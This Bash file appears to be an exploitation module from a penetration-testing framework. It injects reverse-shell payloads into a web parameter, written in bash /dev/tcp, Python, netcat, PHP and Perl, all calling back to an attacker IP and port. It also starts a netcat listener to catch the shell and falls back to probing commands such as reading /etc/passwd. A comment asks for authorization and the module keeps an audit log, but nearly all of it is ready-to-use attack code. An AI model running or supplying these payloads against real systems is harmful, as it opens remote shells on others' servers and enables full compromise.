#!/bin/bash

# RCE Exploitation Module
# DANGER: This module performs REAL exploitation attempts
# Use only with explicit authorization!

source "$(dirname "${BASH_SOURCE[0]}")/../../core/logger.sh"
source "$(dirname "${BASH_SOURCE[0]}")/../../core/database.sh"

# Exploit RCE vulnerability
exploit_rce() {
    local finding_id=$1
    local url=$2
    local parameter=$3
    local project_id=$4
    local attacker_ip=$5
    local attacker_port=${6:-4444}

    log_warning "[RCE Exploit] Starting RCE exploitation"
    log_warning "[RCE Exploit] Target: $url"
    log_warning "[RCE Exploit] Parameter: $parameter"
    log_warning "[RCE Exploit] Attacker: ${attacker_ip}:${attacker_port}"

    # Create exploitation directory
    local exploit_dir="data/projects/${project_id}/exploitation/rce_${finding_id}"
    mkdir -p "$exploit_dir"

    # Audit log
    log_exploit_attempt "$project_id" "rce" "$url" "$attacker_ip:$attacker_port"

    # Attempt different reverse shell techniques
    local success=false

    # Try 1: Bash reverse shell
    if ! $success; then
        log_info "[RCE Exploit] Attempting Bash reverse shell..."
        if attempt_bash_reverse_shell "$url" "$parameter" "$attacker_ip" "$attacker_port" "$exploit_dir"; then
            success=true
            log_critical "[RCE Exploit] Bash reverse shell successful!"
        fi
    fi

    # Try 2: Python reverse shell
    if ! $success; then
        log_info "[RCE Exploit] Attempting Python reverse shell..."
        if attempt_python_reverse_shell "$url" "$parameter" "$attacker_ip" "$attacker_port" "$exploit_dir"; then
            success=true
            log_critical "[RCE Exploit] Python reverse shell successful!"
        fi
    fi

    # Try 3: Netcat reverse shell
    if ! $success; then
        log_info "[RCE Exploit] Attempting Netcat reverse shell..."
        if attempt_netcat_reverse_shell "$url" "$parameter" "$attacker_ip" "$attacker_port" "$exploit_dir"; then
            success=true
            log_critical "[RCE Exploit] Netcat reverse shell successful!"
        fi
    fi

    # Try 4: PHP reverse shell (if PHP detected)
    if ! $success; then
        log_info "[RCE Exploit] Attempting PHP reverse shell..."
        if attempt_php_reverse_shell "$url" "$parameter" "$attacker_ip" "$attacker_port" "$exploit_dir"; then
            success=true
            log_critical "[RCE Exploit] PHP reverse shell successful!"
        fi
    fi

    # Try 5: Perl reverse shell
    if ! $success; then
        log_info "[RCE Exploit] Attempting Perl reverse shell..."
        if attempt_perl_reverse_shell "$url" "$parameter" "$attacker_ip" "$attacker_port" "$exploit_dir"; then
            success=true
            log_critical "[RCE Exploit] Perl reverse shell successful!"
        fi
    fi

    # If no reverse shell, try basic command execution
    if ! $success; then
        log_info "[RCE Exploit] Attempting basic command execution..."
        if attempt_command_execution "$url" "$parameter" "$exploit_dir"; then
            success=true
            log_success "[RCE Exploit] Basic command execution successful!"
        fi
    fi

    if $success; then
        db_add_finding "$project_id" "critical" "rce_exploitation_success" \
            "RCE Exploitation Successful" \
            "Successfully exploited RCE vulnerability!\n\nTarget: $url\nParameter: $parameter\nEvidence: $exploit_dir\n\nThis confirms the vulnerability can be weaponized for full system compromise." \
            "" "10.0" \
            "IMMEDIATE ACTION REQUIRED"
        return 0
    else
        log_warn "[RCE Exploit] All reverse shell attempts failed"
        return 1
    fi
}

# Attempt Bash reverse shell
attempt_bash_reverse_shell() {
    local url=$1
    local param=$2
    local attacker_ip=$3
    local attacker_port=$4
    local exploit_dir=$5

    log_debug "[RCE] Testing Bash reverse shell payloads"

    # Bash reverse shell payloads
    local payloads=(
        "bash -i >& /dev/tcp/${attacker_ip}/${attacker_port} 0>&1"
        "bash -c 'bash -i >& /dev/tcp/${attacker_ip}/${attacker_port} 0>&1'"
        "/bin/bash -i >& /dev/tcp/${attacker_ip}/${attacker_port} 0>&1"
        "0<&196;exec 196<>/dev/tcp/${attacker_ip}/${attacker_port}; bash <&196 >&196 2>&196"
        "bash -c 'exec 5<>/dev/tcp/${attacker_ip}/${attacker_port};cat <&5 | while read line; do \$line 2>&5 >&5; done'"
    )

    # Start listener (in background)
    local listener_log="${exploit_dir}/bash_listener.log"
    start_listener "$attacker_port" "$listener_log" &
    local listener_pid=$!

    sleep 2  # Give listener time to start

    for payload in "${payloads[@]}"; do
        log_debug "[RCE] Trying payload: ${payload:0:50}..."

        # URL encode and inject
        local test_url=$(build_rce_url "$url" "$param" "$payload")

        # Execute payload
        curl -s -L --max-time 5 "$test_url" >/dev/null 2>&1 &

        # Wait for connection
        sleep 3

        # Check if we got a connection
        if grep -q "Connection from" "$listener_log" 2>/dev/null; then
            log_success "[RCE] Bash reverse shell connected!"

            # Save exploitation evidence
            cat > "${exploit_dir}/bash_exploit_success.txt" <<EOF
Bash Reverse Shell Exploitation Success
Timestamp: $(date)
Target: $url
Parameter: $param
Payload: $payload
Attacker: ${attacker_ip}:${attacker_port}

Listener log:
$(cat "$listener_log")
EOF

            # Clean up listener
            kill $listener_pid 2>/dev/null

            return 0
        fi
    done

    # Clean up listener
    kill $listener_pid 2>/dev/null

    return 1
}

# Attempt Python reverse shell
attempt_python_reverse_shell() {
    local url=$1
    local param=$2
    local attacker_ip=$3
    local attacker_port=$4
    local exploit_dir=$5

    log_debug "[RCE] Testing Python reverse shell payloads"

    # Python reverse shell payloads
    local payloads=(
        "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${attacker_ip}\",${attacker_port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
        "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${attacker_ip}\",${attacker_port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
        "python -c 'import socket,os,pty;s=socket.socket();s.connect((\"${attacker_ip}\",${attacker_port}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'"
    )

    # Start listener
    local listener_log="${exploit_dir}/python_listener.log"
    start_listener "$attacker_port" "$listener_log" &
    local listener_pid=$!

    sleep 2

    for payload in "${payloads[@]}"; do
        log_debug "[RCE] Trying Python payload..."

        local test_url=$(build_rce_url "$url" "$param" "$payload")
        curl -s -L --max-time 5 "$test_url" >/dev/null 2>&1 &

        sleep 3

        if grep -q "Connection from" "$listener_log" 2>/dev/null; then
            log_success "[RCE] Python reverse shell connected!"

            cat > "${exploit_dir}/python_exploit_success.txt" <<EOF
Python Reverse Shell Exploitation Success
Timestamp: $(date)
Target: $url
Payload: $payload
Attacker: ${attacker_ip}:${attacker_port}

Listener log:
$(cat "$listener_log")
EOF

            kill $listener_pid 2>/dev/null
            return 0
        fi
    done

    kill $listener_pid 2>/dev/null
    return 1
}

# Attempt Netcat reverse shell
attempt_netcat_reverse_shell() {
    local url=$1
    local param=$2
    local attacker_ip=$3
    local attacker_port=$4
    local exploit_dir=$5

    log_debug "[RCE] Testing Netcat reverse shell payloads"

    # Netcat payloads (various versions)
    local payloads=(
        "nc ${attacker_ip} ${attacker_port} -e /bin/sh"
        "nc ${attacker_ip} ${attacker_port} -e /bin/bash"
        "nc.traditional ${attacker_ip} ${attacker_port} -e /bin/bash"
        "ncat ${attacker_ip} ${attacker_port} -e /bin/bash"
        "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${attacker_ip} ${attacker_port} >/tmp/f"
    )

    local listener_log="${exploit_dir}/nc_listener.log"
    start_listener "$attacker_port" "$listener_log" &
    local listener_pid=$!

    sleep 2

    for payload in "${payloads[@]}"; do
        log_debug "[RCE] Trying Netcat payload: ${payload:0:40}..."

        local test_url=$(build_rce_url "$url" "$param" "$payload")
        curl -s -L --max-time 5 "$test_url" >/dev/null 2>&1 &

        sleep 3

        if grep -q "Connection from" "$listener_log" 2>/dev/null; then
            log_success "[RCE] Netcat reverse shell connected!"

            cat > "${exploit_dir}/nc_exploit_success.txt" <<EOF
Netcat Reverse Shell Exploitation Success
Timestamp: $(date)
Target: $url
Payload: $payload
Attacker: ${attacker_ip}:${attacker_port}

Listener log:
$(cat "$listener_log")
EOF

            kill $listener_pid 2>/dev/null
            return 0
        fi
    done

    kill $listener_pid 2>/dev/null
    return 1
}

# Attempt PHP reverse shell
attempt_php_reverse_shell() {
    local url=$1
    local param=$2
    local attacker_ip=$3
    local attacker_port=$4
    local exploit_dir=$5

    log_debug "[RCE] Testing PHP reverse shell payloads"

    # PHP reverse shell payloads
    local payloads=(
        "php -r '\$sock=fsockopen(\"${attacker_ip}\",${attacker_port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        "php -r '\$sock=fsockopen(\"${attacker_ip}\",${attacker_port});shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        "php -r '\$sock=fsockopen(\"${attacker_ip}\",${attacker_port});system(\"/bin/sh -i <&3 >&3 2>&3\");'"
    )

    local listener_log="${exploit_dir}/php_listener.log"
    start_listener "$attacker_port" "$listener_log" &
    local listener_pid=$!

    sleep 2

    for payload in "${payloads[@]}"; do
        log_debug "[RCE] Trying PHP payload..."

        local test_url=$(build_rce_url "$url" "$param" "$payload")
        curl -s -L --max-time 5 "$test_url" >/dev/null 2>&1 &

        sleep 3

        if grep -q "Connection from" "$listener_log" 2>/dev/null; then
            log_success "[RCE] PHP reverse shell connected!"

            cat > "${exploit_dir}/php_exploit_success.txt" <<EOF
PHP Reverse Shell Exploitation Success
Timestamp: $(date)
Target: $url
Payload: $payload
Attacker: ${attacker_ip}:${attacker_port}
EOF

            kill $listener_pid 2>/dev/null
            return 0
        fi
    done

    kill $listener_pid 2>/dev/null
    return 1
}

# Attempt Perl reverse shell
attempt_perl_reverse_shell() {
    local url=$1
    local param=$2
    local attacker_ip=$3
    local attacker_port=$4
    local exploit_dir=$5

    log_debug "[RCE] Testing Perl reverse shell payloads"

    local payloads=(
        "perl -e 'use Socket;\$i=\"${attacker_ip}\";\$p=${attacker_port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
    )

    local listener_log="${exploit_dir}/perl_listener.log"
    start_listener "$attacker_port" "$listener_log" &
    local listener_pid=$!

    sleep 2

    for payload in "${payloads[@]}"; do
        log_debug "[RCE] Trying Perl payload..."

        local test_url=$(build_rce_url "$url" "$param" "$payload")
        curl -s -L --max-time 5 "$test_url" >/dev/null 2>&1 &

        sleep 3

        if grep -q "Connection from" "$listener_log" 2>/dev/null; then
            log_success "[RCE] Perl reverse shell connected!"
            kill $listener_pid 2>/dev/null
            return 0
        fi
    done

    kill $listener_pid 2>/dev/null
    return 1
}

# Attempt basic command execution (no reverse shell)
attempt_command_execution() {
    local url=$1
    local param=$2
    local exploit_dir=$3

    log_debug "[RCE] Testing basic command execution"

    # Test commands that produce identifiable output
    local test_commands=(
        "id"
        "whoami"
        "uname -a"
        "pwd"
        "ls -la /etc/passwd"
    )

    for cmd in "${test_commands[@]}"; do
        log_debug "[RCE] Executing: $cmd"

        local test_url=$(build_rce_url "$url" "$param" "$cmd")
        local response=$(curl -s -L --max-time 10 "$test_url")

        # Check for command output
        case "$cmd" in
            "id")
                if echo "$response" | grep -qE "uid=|gid=|groups="; then
                    log_success "[RCE] Command execution confirmed: $cmd"
                    save_command_output "$exploit_dir" "$cmd" "$response"
                    return 0
                fi
                ;;
            "whoami")
                if echo "$response" | grep -qE "^(root|www-data|apache|nginx|nobody)"; then
                    log_success "[RCE] Command execution confirmed: $cmd"
                    save_command_output "$exploit_dir" "$cmd" "$response"
                    return 0
                fi
                ;;
            "uname -a")
                if echo "$response" | grep -qiE "linux|unix|gnu"; then
                    log_success "[RCE] Command execution confirmed: $cmd"
                    save_command_output "$exploit_dir" "$cmd" "$response"
                    return 0
                fi
                ;;
            "ls -la /etc/passwd")
                if echo "$response" | grep -qE "root|passwd"; then
                    log_success "[RCE] Command execution confirmed: $cmd"
                    save_command_output "$exploit_dir" "$cmd" "$response"
                    return 0
                fi
                ;;
        esac
    done

    return 1
}

# Helper: Start listener (using netcat if available)
start_listener() {
    local port=$1
    local log_file=$2

    if command -v nc &> /dev/null; then
        nc -lvnp "$port" > "$log_file" 2>&1
    elif command -v ncat &> /dev/null; then
        ncat -lvnp "$port" > "$log_file" 2>&1
    else
        # Fallback: create a simple socket listener with Python/Bash
        log_warn "[RCE] Netcat not found, cannot start listener"
        echo "No listener available" > "$log_file"
    fi
}

# Helper: Build RCE test URL
build_rce_url() {
    local url=$1
    local param=$2
    local command=$3

    # URL encode command
    local encoded_cmd=$(urlencode "$command")

    if [[ "$url" == *"?"* ]]; then
        if [[ "$url" == *"$param="* ]]; then
            echo "$url" | sed "s|$param=[^&]*|$param=$encoded_cmd|"
        else
            echo "${url}&${param}=${encoded_cmd}"
        fi
    else
        echo "${url}?${param}=${encoded_cmd}"
    fi
}

# Helper: URL encode
urlencode() {
    local string="$1"
    local strlen=${#string}
    local encoded=""
    local pos c o

    for (( pos=0 ; pos<strlen ; pos++ )); do
        c=${string:$pos:1}
        case "$c" in
            [-_.~a-zA-Z0-9] ) o="${c}" ;;
            * ) printf -v o '%%%02x' "'$c"
        esac
        encoded+="${o}"
    done

    echo "$encoded"
}

# Helper: Save command output
save_command_output() {
    local exploit_dir=$1
    local command=$2
    local output=$3

    local timestamp=$(date +%Y%m%d_%H%M%S)
    local filename=$(echo "$command" | tr ' ' '_')

    cat > "${exploit_dir}/command_${filename}_${timestamp}.txt" <<EOF
Command Execution Evidence
Timestamp: $(date)
Command: $command

Output:
$output
EOF

    log_debug "[RCE] Evidence saved: command_${filename}_${timestamp}.txt"
}

# Helper: Log exploitation attempt (for audit trail)
log_exploit_attempt() {
    local project_id=$1
    local exploit_type=$2
    local target=$3
    local details=$4

    local audit_file="data/projects/${project_id}/exploitation_audit.log"

    cat >> "$audit_file" <<EOF
[$(date '+%Y-%m-%d %H:%M:%S')] EXPLOITATION ATTEMPT
Type: $exploit_type
Target: $target
Details: $details
User: $(whoami)
Hostname: $(hostname)
---
EOF

    log_debug "[Audit] Logged exploitation attempt"
}

# Export functions
export -f exploit_rce
export -f attempt_bash_reverse_shell
export -f attempt_python_reverse_shell
export -f attempt_netcat_reverse_shell
export -f attempt_php_reverse_shell
export -f attempt_perl_reverse_shell
export -f attempt_command_execution
export -f start_listener
export -f build_rce_url
export -f urlencode
export -f save_command_output
export -f log_exploit_attempt
